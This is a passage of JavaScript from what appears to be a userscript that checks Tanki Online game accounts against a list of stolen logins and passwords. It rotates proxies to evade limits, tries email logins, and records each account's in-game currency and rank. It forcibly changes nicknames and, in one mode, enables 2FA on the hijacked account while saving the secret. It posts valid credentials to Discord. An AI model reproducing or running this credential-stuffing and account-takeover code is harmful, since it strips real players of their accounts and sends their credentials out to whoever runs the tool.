        let usedLogin = normalizeEmail(email) || login, loginWasEmail = !!normalizeEmail(email), changedNickname = null;
        try {
            if (checkConnectionError()) { location.reload(); return { login, status: "reload" }; }
            const startContainer = await tryFindElement(".StartScreenComponentStyle-mainContainer", 800, 3);
            if (startContainer) { startContainer.click(); await sleep(randomDelay(220, 380)); }
            await clickByText("Игровой аккаунт", 8500);
            await clickByText("Авторизация", 6500);
            await enterCredentialsAndPlay(usedLogin, password);
            await sleep(800);
            if (await reloadIfLoginFormEmptyTooLong(5000)) return { login, status: "reload_empty" };
            let captchaResult = await handleCaptchaIfVisible(login, timestamp);
            if (captchaResult) return captchaResult;

            let triedEmail = false;
            while (isRunning) {
                if (checkConnectionError()) { location.reload(); return { login, status: "reload" }; }
                timestamp = new Date().toLocaleTimeString();
                if (await reloadIfLoginFormEmptyTooLong(5000)) return { login, status: "reload_empty" };
                captchaResult = await handleCaptchaIfVisible(login, timestamp);
                if (captchaResult) return captchaResult;

                if (handleEmptyLoginOrEmailError()) {
                    return { login, status: "empty_login_reload" };
                }

                if (isLogin2FAVisible()) {
                    const solved = await solveLogin2FAIfPresent(login, email);
                    if (solved === "solved") {
                        resetCaptchaCount("2FA solved");
                        await sleep(400);
                        continue;
                    }
                    resetCaptchaCount("2FA");
                    setAccountStatus(login, { twofa: true, reason: solved === "no_secret" ? "2FA: нет секрета" : "Требуется 2FA" });
                    advanceCheckQueue();
                    location.reload();
                    return { login, status: "twofa" };
                }

                const errorElement = document.querySelector(".EntranceComponentStyle-invalidForm");
                if (errorElement) {
                    if (isEmptyLoginOrEmailErrorVisible()) {
                        if (handleEmptyLoginOrEmailError()) return { login, status: "empty_login_reload" };
                    }
                    if (!triedEmail && normalizeEmail(email)) {
                        triedEmail = true;
                        usedLogin = email;
                        loginWasEmail = true;
                        await sleep(200);
                        await enterCredentialsAndPlay(usedLogin, password);
                        continue;
                    }
                    resetCaptchaCount("invalid");
                    setAccountStatus(login, { invalid: true, reason: "Неверный логин/пароль" });
                    advanceCheckQueue();
                    const nextAcc = getNextAccount();
                    if (!nextAcc || !isRunning) { clearInputFields(); return { login, status: "invalid" }; }
                    login = nextAcc.login;
                    password = nextAcc.password;
                    email = normalizeEmail(nextAcc.email);
                    usedLogin = login;
                    loginWasEmail = false;

                    if (proxyRotationManager) {
                        const nextProxyReady = await proxyRotationManager.beginAccountCheck(login);
                        if (!nextProxyReady) {
                            console.error(`[PROXY] FastValid: proxy is not ready for next account ${login}`);
                            return { login, status: "proxy_not_ready" };
                        }
                    }
                    triedEmail = false;
                    await sleep(70);
                    await enterCredentialsAndPlay(login, password);
                    continue;
                }

                const blocked = document.querySelector(".SystemMessageStyle-message");
                if (blocked && blocked.textContent.includes("заблокирован")) {
                    resetCaptchaCount("blocked");
                    setAccountStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
                    advanceCheckQueue();
                    location.reload();
                    return { login, status: "blocked" };
                }

                const nickFormEarly = findNicknameForm();
                const nickTitleEl = document.querySelector(".HeaderComponentStyle-messageTitle") || document.querySelector(".EntranceComponentStyle-title");
                const nickTitleText = (nickTitleEl?.textContent || "").trim();
                if (nickFormEarly || nickTitleText.includes("Изменить никнейм")) {
                    resetCaptchaCount("nickname form");
                    const form = nickFormEarly || findNicknameForm();
                    const wait = form ? { form, input: form.querySelector("#username") } : await waitForNicknameForm(15000);
                    if (!wait || !wait.input) {
                        setAccountStatus(login, { nicknameChanged: true, reason: "Форма смены ника не найдена" });
                        advanceCheckQueue();
                        location.reload();
                        return { login, status: "nickname_form_missing" };
                    }
                    const nickResult = await fillNicknameAndSave(wait.form, wait.input);
                    if (!nickResult.ok) {
                        if (nickResult.status === "blocked") {
                            resetCaptchaCount("blocked after nick");
                            setAccountStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
                            advanceCheckQueue();
                            location.reload();
                            return { login, status: "blocked" };
                        }
                        if (nickResult.status === "twofa") {
                            resetCaptchaCount("2FA after nick");
                            setAccountStatus(login, { twofa: true, reason: "Требуется 2FA" });
                            advanceCheckQueue();
                            location.reload();
                            return { login, status: "twofa" };
                        }
                        setAccountStatus(login, { nicknameChanged: true, nicknameError: nickResult.error || "fail", reason: nickResult.error || "Не удалось сменить ник" });
                        advanceCheckQueue();
                        location.reload();
                        return { login, status: "nickname_fail" };
                    }
                    changedNickname = nickResult.nickname;
                    console.log(`[${timestamp}] ✅ Ник изменён ${login} → ${changedNickname}`);
                    break;
                }
                break;
            }

            if (!isRunning) return { login, status: "stopped" };

            {
                const deadline = Date.now() + 12000;
                let ready = false;
                while (Date.now() < deadline) {
                    const blockedPost = document.querySelector(".SystemMessageStyle-message");
                    if (blockedPost && (blockedPost.textContent || "").includes("заблокирован")) {
                        resetCaptchaCount("blocked post-login");
                        setAccountStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
                        advanceCheckQueue();
                        location.reload();
                        return { login, status: "blocked" };
                    }
                    if (isLogin2FAVisible()) {
                        const solved = await solveLogin2FAIfPresent(login, email);
                        if (solved === "solved") {
                            resetCaptchaCount("2FA solved post-login");
                            await sleep(500);
                            continue;
                        }
                        resetCaptchaCount("2FA post-login");
                        setAccountStatus(login, { twofa: true, reason: "Требуется 2FA" });
                        advanceCheckQueue();
                        location.reload();
                        return { login, status: "twofa" };
                    }
                    if (document.querySelector(".UserInfoContainerStyle-userNameRank")) { ready = true; break; }
                    await sleep(200);
                }
                if (!ready) {
                    try { await waitForElement(".UserInfoContainerStyle-userNameRank", 4000, 4); }
                    catch (e) {
                        const blockedF = document.querySelector(".SystemMessageStyle-message");
                        if (blockedF && (blockedF.textContent || "").includes("заблокирован")) {
                            resetCaptchaCount("blocked final");
                            setAccountStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
                            advanceCheckQueue();
                            location.reload();
                            return { login, status: "blocked" };
                        }
                        if (isLogin2FAVisible()) {
                            const solved = await solveLogin2FAIfPresent(login, email);
                            if (solved === "solved") {
                                resetCaptchaCount("2FA solved final");
                                await sleep(800);
                                try { await waitForElement(".UserInfoContainerStyle-userNameRank", 8000, 6); }
                                catch (_) {}
                            } else {
                                resetCaptchaCount("2FA final");
                                setAccountStatus(login, { twofa: true, reason: "Требуется 2FA" });
                                advanceCheckQueue();
                                location.reload();
                                return { login, status: "twofa" };
                            }
                        } else {
                            throw e;
                        }
                    }
                }
            }
            resetCaptchaCount("успешный вход");
            clearEmptyLoginReloadState();
            await ensureInLobby();
            console.log(`[${timestamp}] ✅ ${login} - Успешный вход`);
            await sleep(650);

            let bonusReceived = false;
            const bonusElement = document.querySelector(".RepatriationBonusStyle-buttonTake");
            if (bonusElement) {
                bonusElement.click();
                bonusReceived = true;
                await sleep(randomDelay(700, 1100));
            }

            const nickname = getCurrentNickname();
            const rubies = getRubies() || "0";
            const crystals = getCrystals() || "0";
            const experience = getExperience();
            const rankName = getRankByExperience(experience).rankName;

            if (experience < MIN_EXPERIENCE) {
                setAccountStatus(login, { skippedLowRank: true, reason: "Опыт < Штаб-сержант", experience, rank: rankName });
                advanceCheckQueue();
                location.reload();
                return { login, status: "skippedLowRank" };
            }

            await clickGarage();
            await sleep(randomDelay(1800, 2600));
            const goldBoxes = await getGoldBoxes();
            const tankoins = await getTankoins();
            await closeAnyModal();
            await sleep(randomDelay(400, 700));
            let leftGarage = await exitToLobbyOld();
            if (!leftGarage) {
                console.warn("[lobby] Гараж: повторный выход");
                await sleep(1000);
                leftGarage = await exitToLobby();
            }
            if (!leftGarage) {
                console.warn("[lobby] Гараж: всё ещё не лобби, ещё попытка");
                await sleep(1500);
                await exitToLobbyOld();
            }
            await sleep(randomDelay(1000, 1500));
            await openSettingsAndAccount();
            await sleep(randomDelay(800, 1200));
            const { nickChange, hasEmail, emailText } = await checkNickChangeAndEmail();
            const accInfo = ACCOUNTS.find(a => a.login === login) || RUBIES_ACCOUNTS.find(a => a.login === login) || {};
            const finalEmail = accInfo.email || (loginWasEmail ? usedLogin : null) || (hasEmail ? emailText : "нет");
            const ip = CONFIG.IP_CHECK_ENABLED ? await fetchCurrentIP() : null;

            let twofaEnableResult = null;
            if (CONFIG.AUTO_ENABLE_2FA && MODE === "checker") {
                try {
                    twofaEnableResult = await enable2FAOnCurrentAccount({
                        login,
                        password,
                        email: finalEmail,
                        nickname,
                        rank: rankName,
                        experience,
                        rubies,
                        crystals,
                        tankoins,
                        bound: accInfo.bound,
                        year: accInfo.year
                    });
                    if (twofaEnableResult?.ok && !twofaEnableResult.already) {
                        showToast(`2FA включена: ${login}`, "success");
                    } else if (twofaEnableResult?.already) {
                        console.log(`[2FA] Уже активна: ${login}`);
                    } else if (twofaEnableResult && !twofaEnableResult.ok) {
                        console.warn(`[2FA] Не удалось включить для ${login}:`, twofaEnableResult.error);
                        showToast(`2FA не включена: ${twofaEnableResult.error || "ошибка"}`, "warning");
                    }
                } catch (e2fa) {
                    console.error("[2FA] exception:", e2fa);
                }
            }

            const prev = getAccountStatus(login) || {};
            const status = {
                ...prev,
                done: true,
                valid: true,
                username: nickname,
                rubies, crystals, experience,
                rank: rankName,
                goldBoxes, tankoins,
                nickChange, hasEmail, bonusReceived,
                year: accInfo.year,
                bound: accInfo.bound,
                loginEmail: loginWasEmail ? usedLogin : null,
                proxyIp: ip,
                newNickname: changedNickname || null,
                nicknameFixed: !!changedNickname,
                twofaEnabledByScript: !!(twofaEnableResult && twofaEnableResult.ok && !twofaEnableResult.already),
                twofaSecretSaved: !!(twofaEnableResult && twofaEnableResult.ok && twofaEnableResult.secret)
            };
            if (bonusReceived) {
                status.rubiesEligible = true;
                if (CONFIG.RUBIES_AUTO_ADD_BONUS) {
                    status.rubiesEnabled = true;
                    addToRubiesList(login);
                }
            }
            setAccountStatus(login, status);

            upsertValidResult({
                login,
                password,
                username: nickname,
                rank: rankName,
                experience,
                rubies, crystals, goldBoxes, tankoins,
                year: accInfo.year,
                bound: accInfo.bound,
                nickChange,
                bonusReceived,
                newNickname: changedNickname || null,
                loginWasEmail,
                proxyIp: ip,
                source: "checker",
                twofaSecret: (twofaEnableResult && twofaEnableResult.secret) || (get2FAByLogin(login)?.secret) || null
            });

            await notifyValidAccount({
                login, password, email: finalEmail,
                rubies, tankoins, crystals, goldBoxes,
                rank: rankName, experience,
                year: accInfo.year, bound: accInfo.bound,
                nickChange, ip, loginWasEmail,
                bonusReceived,
                loginUsed: usedLogin,
                newNickname: changedNickname || null,
                twofaSecret: (twofaEnableResult && twofaEnableResult.ok && twofaEnableResult.secret)
                    ? twofaEnableResult.secret
                    : null
            });
            await sleep(400);

            advanceCheckQueue();
            if (!isRunning) return { login, status: "stopped" };
            const nextAcc = getNextAccount();
            if (nextAcc) location.reload();
            else {
                setRunningState(false);
                clearCheckQueue();
                updateUI();
                showToast("Все подходящие аккаунты проверены", "success");
            }
            return { login, status: "success" };

        } catch (error) {
            console.error(`[${timestamp}] ❌ Ошибка ${login}:`, error);
            resetCaptchaCount("error");
            setAccountStatus(login, { ...(getAccountStatus(login) || {}), error: true, reason: error.message });
            advanceCheckQueue();
            clearInputFields();
            return { login, status: "error" };
        }
    }

    // =========================================================
    // FAST VALID CHECKER (MODE === "fastValid")
    // =========================================================
    async function checkAccountFastValid(login, password, email = null) {
        email = normalizeEmail(email);
        if (!isRunning) return { login, status: "stopped" };

        if (CONFIG.PROXY_ENABLED) {
            if (proxyRotationManager) {
                const proxyReady = await proxyRotationManager.beginAccountCheck(login);
                if (!proxyReady) {
                    console.error(`[PROXY] FastValid: proxy is not ready for ${login}; account check is paused`);
                    return { login, status: "proxy_not_ready" };
                }
            } else {
                console.error("[PROXY] FastValid: ProxyRotationManager is not initialized");
                return { login, status: "proxy_not_initialized" };
            }
        } else if (proxyRotationManager) {
            await proxyRotationManager.beginAccountCheck(login);
        }

        const log = (msg) => console.log(`[FastValid] ${msg}`);
        let timestamp = new Date().toLocaleTimeString();
        log(`Авторизация: ${login}`);

        if (isFastValidFinished(login)) {
            advanceFastValidQueue();
            return { login, status: "skipped" };
        }

        if (window.__tankiFastValidHandledLogin === login) {
            log(`Уже обработан на этой странице: ${login}`);
            return { login, status: "already_handled" };
        }

        let usedLogin = normalizeEmail(email) || login;
        let loginWasEmail = !!normalizeEmail(email);

        try {
            if (checkConnectionError()) {
                location.reload();
                return { login, status: "reload" };
            }

            const startContainer = await tryFindElement(".StartScreenComponentStyle-mainContainer", 800, 3);
            if (startContainer) {
                startContainer.click();
                await sleep(randomDelay(220, 380));
            }

            await clickByText("Игровой аккаунт", 8500);
            await clickByText("Авторизация", 6500);
            await enterCredentialsAndPlay(usedLogin, password);
            await sleep(800);

            if (await reloadIfLoginFormEmptyTooLong(5000)) {
                return { login, status: "reload_empty" };
            }

            let captchaResult = await handleCaptchaIfVisible(login, timestamp);
            if (captchaResult) {
                if (captchaResult.status === "captcha") log(`🤖 CAPTCHA ${getCaptchaCount()}/${CAPTCHA_LIMIT}: ${login}`);
                if (captchaResult.status === "captcha_stop") log(`🤖 CAPTCHA лимит — стоп: ${login}`);
                return captchaResult;
            }

            let triedEmail = false;
            while (isRunning) {
                if (checkConnectionError()) {
                    location.reload();
                    return { login, status: "reload" };
                }
                timestamp = new Date().toLocaleTimeString();

                if (await reloadIfLoginFormEmptyTooLong(5000)) {
                    return { login, status: "reload_empty" };
                }

                captchaResult = await handleCaptchaIfVisible(login, timestamp);
                if (captchaResult) {
                    if (captchaResult.status === "captcha") log(`🤖 CAPTCHA ${getCaptchaCount()}/${CAPTCHA_LIMIT}: ${login}`);
                    if (captchaResult.status === "captcha_stop") log(`🤖 CAPTCHA лимит — стоп: ${login}`);
                    return captchaResult;
                }

                if (handleEmptyLoginOrEmailError()) {
                    return { login, status: "empty_login_reload" };
                }

                const twofa = document.querySelector(".EntranceComponentStyle-title");
                if (twofa && twofa.textContent.includes("Код безопасности")) {
                    resetCaptchaCount("2FA");
                    log(`🔐 2FA: ${login}`);
                    setFastValidStatus(login, { twofa: true, reason: "Требуется 2FA" });
                    advanceFastValidQueue();
                    location.reload();
                    return { login, status: "twofa" };
                }

                const errorElement = document.querySelector(".EntranceComponentStyle-invalidForm");
                if (errorElement) {
                    if (isEmptyLoginOrEmailErrorVisible()) {
                        if (handleEmptyLoginOrEmailError()) return { login, status: "empty_login_reload" };
                    }
                    if (!triedEmail && normalizeEmail(email)) {
                        triedEmail = true;
                        usedLogin = email;
                        loginWasEmail = true;
                        await sleep(200);
                        await enterCredentialsAndPlay(usedLogin, password);
                        continue;
                    }
                    resetCaptchaCount("invalid");
                    log(`❌ Ошибка авторизации: ${login}`);
                    setFastValidStatus(login, { invalid: true, reason: "Неверный логин/пароль" });
                    advanceFastValidQueue();
                    const nextAcc = getNextAccount();
                    if (!nextAcc || !isRunning) {
                        clearInputFields();
                        return { login, status: "invalid" };
                    }
                    login = nextAcc.login;
                    password = nextAcc.password;
                    email = normalizeEmail(nextAcc.email);
                    usedLogin = login;
                    loginWasEmail = false;
                    triedEmail = false;
                    await sleep(70);
                    await enterCredentialsAndPlay(login, password);
                    continue;
                }

                const blocked = document.querySelector(".SystemMessageStyle-message");
                if (blocked && blocked.textContent.includes("заблокирован")) {
                    resetCaptchaCount("blocked");
                    log(`🚫 Заблокирован: ${login}`);
                    setFastValidStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
                    advanceFastValidQueue();
                    location.reload();
                    return { login, status: "blocked" };
                }

                const nickFormEarly = findNicknameForm();
                const nickTitleEl = document.querySelector(".HeaderComponentStyle-messageTitle") || document.querySelector(".EntranceComponentStyle-title");
                const nickTitleText = (nickTitleEl?.textContent || "").trim();
                if (nickFormEarly || nickTitleText.includes("Изменить никнейм")) {
                    resetCaptchaCount("nickname form");
                    log(`🔄 Требуется смена ника (пропуск): ${login}`);
                    setFastValidStatus(login, { nicknameChanged: true, reason: "Требуется смена ника (fastValid)" });
                    advanceFastValidQueue();
                    location.reload();
                    return { login, status: "nickname_required" };
                }

                if (document.querySelector(".UserInfoContainerStyle-userNameRank")) {
                    break;
                }

                await sleep(150);
            }

            if (!isRunning) return { login, status: "stopped" };

            {
                const deadline = Date.now() + 12000;
                let ready = false;
                while (Date.now() < deadline) {
                    const blockedPost = document.querySelector(".SystemMessageStyle-message");
                    if (blockedPost && (blockedPost.textContent || "").includes("заблокирован")) {
                        resetCaptchaCount("blocked post-login");
                        log(`🚫 Заблокирован post-login: ${login}`);
                        setFastValidStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
                        advanceFastValidQueue();
                        location.reload();
                        return { login, status: "blocked" };
                    }
                    const twofaPost = document.querySelector(".EntranceComponentStyle-title");
                    if (twofaPost && (twofaPost.textContent || "").includes("Код безопасности")) {
                        resetCaptchaCount("2FA post-login");
                        log(`🔐 2FA post-login: ${login}`);
                        setFastValidStatus(login, { twofa: true, reason: "Требуется 2FA" });
                        advanceFastValidQueue();
                        location.reload();
                        return { login, status: "twofa" };
                    }
                    if (document.querySelector(".UserInfoContainerStyle-userNameRank")) {
                        ready = true;
                        break;
                    }
                    await sleep(150);
                }
                if (!ready) {
                    try {
                        await waitForElement(".UserInfoContainerStyle-userNameRank", 4000, 4);
                        ready = true;
                    } catch (e) {
                        const blockedF = document.querySelector(".SystemMessageStyle-message");
                        if (blockedF && (blockedF.textContent || "").includes("заблокирован")) {
                            resetCaptchaCount("blocked final");
                            setFastValidStatus(login, { blocked: true, reason: "Аккаунт заблокирован" });
                            advanceFastValidQueue();
                            location.reload();
                            return { login, status: "blocked" };
                        }
                        const twofaF = document.querySelector(".EntranceComponentStyle-title");
                        if (twofaF && (twofaF.textContent || "").includes("Код безопасности")) {
                            resetCaptchaCount("2FA final");
                            setFastValidStatus(login, { twofa: true, reason: "Требуется 2FA" });
                            advanceFastValidQueue();
                            location.reload();
                            return { login, status: "twofa" };
                        }
                        throw e;
                    }
                }
            }

            window.__tankiFastValidHandledLogin = login;
            resetCaptchaCount("успешный вход fastValid");
            clearEmptyLoginReloadState();

            log(`✅ Валидный аккаунт: ${login}`);

            let nickname = null, experience = null, rankName = null, rubies = null, crystals = null;
            try { nickname = getCurrentNickname(); } catch (_) {}
            try { experience = getExperience(); } catch (_) {}
            try {
                if (experience != null) rankName = getRankByExperience(experience).rankName;
            } catch (_) {}
            try { rubies = getRubies() || null; } catch (_) {}
            try { crystals = getCrystals() || null; } catch (_) {}

            const prev = getFastValidStatus(login) || {};
            setFastValidStatus(login, {
                ...prev,
                done: true,
                valid: true,
                fastValid: true,
                username: nickname || prev.username || null,
                experience: experience != null ? experience : (prev.experience ?? null),
                rank: rankName || prev.rank || null,
                rubies: rubies || prev.rubies || null,
                crystals: crystals || prev.crystals || null,
                loginEmail: loginWasEmail ? usedLogin : (prev.loginEmail || null)
            });

            upsertValidResult({
                login,
                password,
                username: nickname || null,
                rank: rankName || null,
                experience: experience != null ? experience : null,
                rubies: rubies || "0",
                crystals: crystals || "0",
                source: "fastValid"
            });
            log(`💾 Результат сохранён: ${login}`);

            const accInfo = FAST_VALID_ACCOUNTS.find(a => a.login === login) || {};
            log(`📤 Discord: ${login}`);
            await notifyValidAccount({
                login,
                password,
                email: accInfo.email || (loginWasEmail ? usedLogin : null) || null,
                rubies: rubies || "—",
                tankoins: "—",
                crystals: crystals || "—",
                goldBoxes: "—",
                rank: rankName || "—",
                experience: experience != null ? experience : "—",
                year: accInfo.year,
                bound: accInfo.bound,
                nickChange: null,
                ip: null,
                loginWasEmail,
                bonusReceived: false,
                loginUsed: usedLogin,
                newNickname: null
            });
            await sleep(350);

            advanceFastValidQueue();
            const nextAcc = getNextAccount();
            if (nextAcc) {
                log(`➡ Следующий аккаунт: ${nextAcc.login}`);
                log(`🔄 Reload`);
                location.reload();
            } else {
                setRunningState(false);
                clearFastValidQueue();
                updateUI();
                showToast("FastValid: все аккаунты проверены", "success");
                log(`Готово — очередь пуста`);
            }
            return { login, status: "success" };

        } catch (error) {
            console.error(`[FastValid] ❌ Ошибка ${login}:`, error);
            resetCaptchaCount("error");
            setFastValidStatus(login, { ...(getFastValidStatus(login) || {}), error: true, reason: error.message });
            advanceFastValidQueue();
            clearInputFields();
            return { login, status: "error" };
        }
    }

    // =========================================================
    // NICKNAME MODE
    // =========================================================
    function isNicknamePending(login) {
        const st = getAccountStatus(login);
        if (!st || !st.nicknameChanged) return false;
        if (st.nicknameFixed) return false;
        if (st.invalid || st.blocked || st.twofa || st.deleted) return false;
        return true;
    }
    async function skipToNextNickname(login, statusKey, reason) {
        resetCaptchaCount(statusKey || reason || "nickname skip");
        const prev = getAccountStatus(login) || {};
        setAccountStatus(login, { ...prev, nicknameChanged: false, [statusKey]: true, reason: reason || statusKey });
        currentIndex++;
        showToast(`${reason || statusKey} — следующий`, "warning");
        location.reload();
        return { login, status: statusKey };
    }
    async function runPostLoginCheck(login, password, opts = {}) {
        const loginWasEmail = !!opts.loginWasEmail;
        const usedLogin = opts.usedLogin || login;
        const extraStatus = opts.extraStatus || {};
        const newNickname = opts.newNickname || extraStatus.newNickname || null;
        try { await waitForElement(".UserInfoContainerStyle-userNameRank", 4000, 4); }
        catch (e) { return { ok: false, status: "lobby_missing" }; }
        resetCaptchaCount("успешный вход post-check");
        await ensureInLobby();
        await sleep(400);
        const blocked = document.querySelector(".SystemMessageStyle-message");
        if (blocked && (blocked.textContent || "").includes("заблокирован")) {
            setAccountStatus(login, { ...extraStatus, blocked: true, reason: "Заблокирован после смены ника" });
            return { ok: false, status: "blocked" };
        }
        const twofa = document.querySelector(".EntranceComponentStyle-title");
        if (twofa && (twofa.textContent || "").includes("Код безопасности")) {
            setAccountStatus(login, { ...extraStatus, twofa: true, reason: "2FA после смены ника" });
            return { ok: false, status: "twofa" };
        }
        let bonusReceived = false;
        const bonusElement = document.querySelector(".RepatriationBonusStyle-buttonTake");
        if (bonusElement) { bonusElement.click(); bonusReceived = true; await sleep(randomDelay(700, 1100)); }
        const nickname = getCurrentNickname();
        const rubies = getRubies() || "0";
        const crystals = getCrystals() || "0";
        const experience = getExperience();
        const rankName = getRankByExperience(experience).rankName;
        if (experience < MIN_EXPERIENCE) {
            setAccountStatus(login, { ...extraStatus, skippedLowRank: true, reason: "Опыт < Штаб-сержант", experience, rank: rankName, username: nickname });
            return { ok: false, status: "skippedLowRank" };
        }
        await clickGarage();
        await sleep(randomDelay(1800, 2600));
        const goldBoxes = await getGoldBoxes();
        const tankoins = await getTankoins();
        await closeAnyModal();
        await sleep(randomDelay(400, 700));
        let leftG = await exitToLobbyOld();
        if (!leftG) { await sleep(1000); leftG = await exitToLobby(); }
        if (!leftG) { await sleep(1500); await exitToLobbyOld(); }
        await sleep(randomDelay(1000, 1500));
        await openSettingsAndAccount();
        await sleep(randomDelay(800, 1200));
        const { nickChange, hasEmail, emailText } = await checkNickChangeAndEmail();
        const accInfo = ACCOUNTS.find(a => a.login === login) || {};
        const finalEmail = accInfo.email || (loginWasEmail ? usedLogin : null) || (hasEmail ? emailText : "нет");
        const ip = CONFIG.IP_CHECK_ENABLED ? await fetchCurrentIP() : null;
        const status = {
            ...extraStatus,
            done: true, valid: true,
            username: nickname, rubies, crystals, experience,
            rank: rankName, goldBoxes, tankoins,
            nickChange, hasEmail, bonusReceived,
            year: accInfo.year, bound: accInfo.bound,
            loginEmail: loginWasEmail ? usedLogin : null,
            proxyIp: ip, newNickname: newNickname || null
        };
        if (bonusReceived) {
            status.rubiesEligible = true;
            if (CONFIG.RUBIES_AUTO_ADD_BONUS) { status.rubiesEnabled = true; addToRubiesList(login); }
        }
        setAccountStatus(login, status);
        upsertValidResult({
            login,
            username: nickname,
            rank: rankName,
            experience,
            rubies, crystals, goldBoxes, tankoins,
            year: accInfo.year,
            bound: accInfo.bound,
            nickChange,
            bonusReceived,
            newNickname: newNickname || null,
            loginWasEmail,
            proxyIp: ip,
            source: "nickname"
        });
        await notifyValidAccount({
            login, password, email: finalEmail,
            rubies, tankoins, crystals, goldBoxes,
            rank: rankName, experience,
            year: accInfo.year, bound: accInfo.bound,
            nickChange, ip, loginWasEmail,
            bonusReceived,
            loginUsed: usedLogin, newNickname
        });
        return { ok: true, status: "success", data: status };
    }
    async function finishNicknameAndCheck(login, password, newNickname, opts = {}) {
        const loginWasEmail = !!opts.loginWasEmail;
        const usedLogin = opts.usedLogin || login;
        const email = normalizeEmail(opts.email);
        const prev = getAccountStatus(login) || {};
        const extraStatus = {
            ...prev,
            nicknameChanged: false,
            nicknameFixed: true,
            newNickname: newNickname || prev.newNickname || null,
            reason: newNickname ? "Ник изменён" : "Форма смены ника не потребовалась"
        };
        setAccountStatus(login, extraStatus);
        let lobbyOk = false;
        const deadline = Date.now() + 12000;
        while (Date.now() < deadline) {
            if (!isRunning) return { login, status: "stopped" };
            const blocked = document.querySelector(".SystemMessageStyle-message");
            if (blocked && (blocked.textContent || "").includes("заблокирован")) return await skipToNextNickname(login, "blocked", "Заблокирован после смены ника");
            const twofa = document.querySelector(".EntranceComponentStyle-title");
            if (twofa && (twofa.textContent || "").includes("Код безопасности")) return await skipToNextNickname(login, "twofa", "2FA после смены ника");
            if (document.querySelector(".UserInfoContainerStyle-userNameRank")) { lobbyOk = true; break; }
            await sleep(200);
        }
        if (!lobbyOk) return await skipToNextNickname(login, "error", "Лобби не загрузилось после смены ника");
        const blocked2 = document.querySelector(".SystemMessageStyle-message");
        if (blocked2 && (blocked2.textContent || "").includes("заблокирован")) return await skipToNextNickname(login, "blocked", "Заблокирован после смены ника");
        const checkResult = await runPostLoginCheck(login, password, {
            loginWasEmail, usedLogin, extraStatus,
            newNickname: extraStatus.newNickname, email
        });
        if (!checkResult.ok) {
            currentIndex++;
            await sleep(40);
            location.reload();
            return { login, status: checkResult.status || "check_fail" };
        }
        currentIndex++;
        if (getNextAccount()) location.reload();
        else { setRunningState(false); updateUI(); showToast("Все аккаунты со сменой ника обработаны", "success"); }
        return { login, status: "success" };
    }
    async function processNicknameAccount(acc) {
        const login = acc.login;
        const password = acc.password;
        let email = normalizeEmail(acc.email);
        if (!isRunning) return { login, status: "stopped" };
        if (!isNicknamePending(login)) { currentIndex++; return { login, status: "skipped" }; }
        let usedLogin = normalizeEmail(email) || login, loginWasEmail = !!normalizeEmail(email);
        try {
            if (checkConnectionError()) { location.reload(); return { login, status: "reload" }; }
            const startContainer = await tryFindElement(".StartScreenComponentStyle-mainContainer", 800, 3);
            if (startContainer) { startContainer.click(); await sleep(randomDelay(220, 380)); }
            await clickByText("Игровой аккаунт", 8500);
            await clickByText("Авторизация", 6500);
            await enterCredentialsAndPlay(usedLogin, password);
            await sleep(800);
            if (await reloadIfLoginFormEmptyTooLong(5000)) return { login, status: "reload_empty" };
            let captchaResult = await handleCaptchaIfVisible(login, new Date().toLocaleTimeString());
            if (captchaResult) return captchaResult;
            let triedEmail = false;
            while (isRunning) {
                const timestamp = new Date().toLocaleTimeString();
                captchaResult = await handleCaptchaIfVisible(login, timestamp);
                if (captchaResult) return captchaResult;
                if (handleEmptyLoginOrEmailError()) return { login, status: "empty_login_reload" };
                const twofa = document.querySelector(".EntranceComponentStyle-title");
                if (twofa && twofa.textContent.includes("Код безопасности")) return await skipToNextNickname(login, "twofa", "Требуется 2FA");
                const errorElement = document.querySelector(".EntranceComponentStyle-invalidForm");
                if (errorElement) {
                    if (isEmptyLoginOrEmailErrorVisible()) {
                        if (handleEmptyLoginOrEmailError()) return { login, status: "empty_login_reload" };
                    }
                    if (!triedEmail && normalizeEmail(email)) {
                        triedEmail = true; usedLogin = email; loginWasEmail = true;
                        await sleep(150); await enterCredentialsAndPlay(usedLogin, password); continue;
                    }
                    return await skipToNextNickname(login, "invalid", "Неверный логин/пароль");
                }
                const blocked = document.querySelector(".SystemMessageStyle-message");
                if (blocked && blocked.textContent.includes("заблокирован")) return await skipToNextNickname(login, "blocked", "Аккаунт заблокирован");
                const nickForm = findNicknameForm();
                const nickTitle = document.querySelector(".HeaderComponentStyle-messageTitle") || document.querySelector(".EntranceComponentStyle-title");
                const titleText = (nickTitle?.textContent || "").trim();
                if (nickForm || titleText.includes("Изменить никнейм")) {
                    resetCaptchaCount("nickname form");
                    const form = nickForm || findNicknameForm();
                    const wait = form ? { form, input: form.querySelector("#username") } : await waitForNicknameForm(15000);
                    if (!wait || !wait.input) { currentIndex++; location.reload(); return { login, status: "nickname_form_missing" }; }
                    const result = await fillNicknameAndSave(wait.form, wait.input);
                    if (!result.ok) {
                        if (result.status === "blocked") return await skipToNextNickname(login, "blocked", "Аккаунт заблокирован");
                        if (result.status === "twofa") return await skipToNextNickname(login, "twofa", "Требуется 2FA");
                        currentIndex++;
                        location.reload();
                        return { login, status: "nickname_fail" };
                    }
                    return await finishNicknameAndCheck(login, password, result.nickname, { loginWasEmail, usedLogin, email });
                }
                const lobbyNick = document.querySelector(".UserInfoContainerStyle-userNameRank");
                if (lobbyNick) {
                    return await finishNicknameAndCheck(login, password, null, { loginWasEmail, usedLogin, email });
                }
                await sleep(300);
            }
            return { login, status: "stopped" };
        } catch (error) {
            console.error(`❌ Ошибка смены ника ${login}:`, error);
            resetCaptchaCount("error nickname");
            const prev = getAccountStatus(login) || {};
            setAccountStatus(login, { ...prev, error: true, reason: error.message });
            currentIndex++;
            clearInputFields();
            return { login, status: "error" };
        }
    }
    async function startNicknameMode() {
        if (selectedIssueSubfilter !== "nickname") { showToast("Сначала выберите «Смена ника»", "warning"); return; }
        if (isRunning) { showToast("Сначала остановите текущий процесс", "warning"); return; }
        const pending = ACCOUNTS.filter(a => isNicknamePending(a.login));
        if (pending.length === 0) { showToast("Нет аккаунтов со статусом «Смена ника»", "info"); return; }
        MODE = "nickname";
        saveConfig();
        setRunningState(true);
        isPaused = false;
        shuffledAccounts = [];
        currentIndex = 0;
        updateUI();
        startChecking();
    }

    // =========================================================
